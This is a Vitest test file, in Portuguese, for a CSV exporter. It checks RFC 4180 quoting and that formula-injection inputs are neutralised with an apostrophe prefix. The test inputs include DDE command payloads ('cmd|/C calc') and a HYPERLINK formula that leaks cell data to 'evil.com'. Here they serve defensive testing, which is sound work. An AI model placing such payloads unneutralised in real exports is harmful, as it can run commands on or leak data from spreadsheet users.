import { describe, it, expect } from 'vitest'
import { formatCsvCell, generateCsv } from '../components/sources/AnalyticsLab'

describe('AUD-005: Exportação Segura de CSV (RFC 4180 e Mitigação de Formula Injection)', () => {
  describe('Formatação de células individuais (formatCsvCell)', () => {
    it('retorna string vazia para valores nulos ou indefinidos', () => {
      expect(formatCsvCell(null)).toBe('')
      expect(formatCsvCell(undefined)).toBe('')
    })

    it('mantém textos e números simples sem alteração ou aspas desnecessárias', () => {
      expect(formatCsvCell('Brasil')).toBe('Brasil')
      expect(formatCsvCell(12345)).toBe('12345')
      expect(formatCsvCell(42.5)).toBe('42.5')
      expect(formatCsvCell(true)).toBe('true')
    })

    it('envolve com aspas duplas células contendo vírgula (RFC 4180)', () => {
      expect(formatCsvCell('São Paulo, SP')).toBe('"São Paulo, SP"')
      expect(formatCsvCell('Petrobras, Vale, Itaú')).toBe('"Petrobras, Vale, Itaú"')
    })

    it('duplica aspas duplas (" -> "") e envolve a célula em aspas (RFC 4180)', () => {
      expect(formatCsvCell('Empresa "Alfa"')).toBe('"Empresa ""Alfa"""')
      expect(formatCsvCell('"aspas no início e fim"')).toBe('"""aspas no início e fim"""')
    })

    it('envolve em aspas células contendo quebra de linha \\n ou \\r (RFC 4180)', () => {
      expect(formatCsvCell('Linha 1\nLinha 2')).toBe('"Linha 1\nLinha 2"')
      expect(formatCsvCell('Linha 1\r\nLinha 2')).toBe('"Linha 1\r\nLinha 2"')
    })

    it('combina escape de aspas, vírgulas e quebras de linha simultaneamente', () => {
      const input = 'Linha 1: "A, B"\nLinha 2: "C"'
      const output = formatCsvCell(input)
      expect(output).toBe('"Linha 1: ""A, B""\nLinha 2: ""C"""')
    })
  })

  describe('Prevenção contra CSV Formula Injection (OWASP)', () => {
    it('protege strings iniciando com "=" prefixando com apóstrofo', () => {
      expect(formatCsvCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)")
      expect(formatCsvCell('=1+1')).toBe("'=1+1")
    })

    it('protege strings iniciando com "+" prefixando com apóstrofo', () => {
      expect(formatCsvCell('+123456789')).toBe("'+123456789")
      expect(formatCsvCell('+cmd|/C calc')).toBe("'+cmd|/C calc")
    })

    it('protege strings iniciando com "-" prefixando com apóstrofo', () => {
      expect(formatCsvCell('-2+3+cmd|/C calc')).toBe("'-2+3+cmd|/C calc")
      expect(formatCsvCell('-100')).toBe("'-100")
    })

    it('preserva números negativos numéricos sem prefixo para não quebrar operações contábeis', () => {
      // typeof val === 'number'
      expect(formatCsvCell(-50.25)).toBe('-50.25')
      expect(formatCsvCell(-10)).toBe('-10')
      expect(formatCsvCell(0)).toBe('0')
    })

    it('protege strings iniciando com "@" prefixando com apóstrofo', () => {
      expect(formatCsvCell('@attacker.com')).toBe("'@attacker.com")
      expect(formatCsvCell('@admin')).toBe("'@admin")
      // Se contiver vírgula, deve além de prefixar com apóstrofo, envolver em aspas (RFC 4180)
      expect(formatCsvCell('@SUM(1,2)')).toBe('"\'@SUM(1,2)"')
    })

    it('protege strings iniciando com caracteres de controle como tabulação (\\t) ou retorno de carro (\\r)', () => {
      expect(formatCsvCell('\t=cmd')).toBe("'\t=cmd")
    })

    it('escapa adequadamente fórmulas perigosas contendo vírgulas e aspas', () => {
      const formulaPayload = '=cmd|\' /C calc\'!A0'
      const formatted = formatCsvCell(formulaPayload)
      expect(formatted).toBe("'=cmd|' /C calc'!A0")

      const complexPayload = '=HYPERLINK("http://evil.com?leak="&A1, "Clique aqui")'
      const formattedComplex = formatCsvCell(complexPayload)
      // Deve iniciar com ' e ter aspas duplicadas e estar envolvido em aspas devido à vírgula
      expect(formattedComplex.startsWith('"\'=HYPERLINK(')).toBe(true)
      expect(formattedComplex).toContain('""http://evil.com?leak=""')
      expect(formattedComplex).toContain('""Clique aqui""')
      expect(formattedComplex.endsWith('"')).toBe(true)
    })
  })

  describe('Geração completa de documento CSV (generateCsv)', () => {
    it('gera cabeçalho e linhas delimitados por \\r\\n conforme RFC 4180', () => {
      const columns = ['ticker', 'empresa', 'valor_bi']
      const rows = [
        { ticker: 'PETR4', empresa: 'Petrobras', valor_bi: 450.5 },
        { ticker: 'VALE3', empresa: 'Vale S.A.', valor_bi: 280.0 },
      ]

      const csv = generateCsv(columns, rows)
      const lines = csv.split('\r\n')

      expect(lines).toHaveLength(3)
      expect(lines[0]).toBe('ticker,empresa,valor_bi')
      expect(lines[1]).toBe('PETR4,Petrobras,450.5')
      expect(lines[2]).toBe('VALE3,Vale S.A.,280')
    })

    it('gera CSV seguro quando os dados contêm fórmulas, aspas e vírgulas', () => {
      const columns = ['id', 'nome', 'comando']
      const rows = [
        { id: 1, nome: 'Normal', comando: 'SELECT 1' },
        { id: 2, nome: 'Vírgula, e "aspas"', comando: '=2+5' },
        { id: 3, nome: 'Fórmula com vírgula', comando: '=SUM(10, 20)' },
      ]

      const csv = generateCsv(columns, rows)
      const lines = csv.split('\r\n')

      expect(lines[1]).toBe('1,Normal,SELECT 1')
      expect(lines[2]).toBe('2,"Vírgula, e ""aspas""",\'=2+5')
      expect(lines[3]).toBe('3,Fórmula com vírgula,"\'=SUM(10, 20)"')
    })

    it('lida graciosamente com tabela vazia', () => {
      const columns = ['col1', 'col2']
      const csv = generateCsv(columns, [])
      expect(csv).toBe('col1,col2')
    })
  })
})
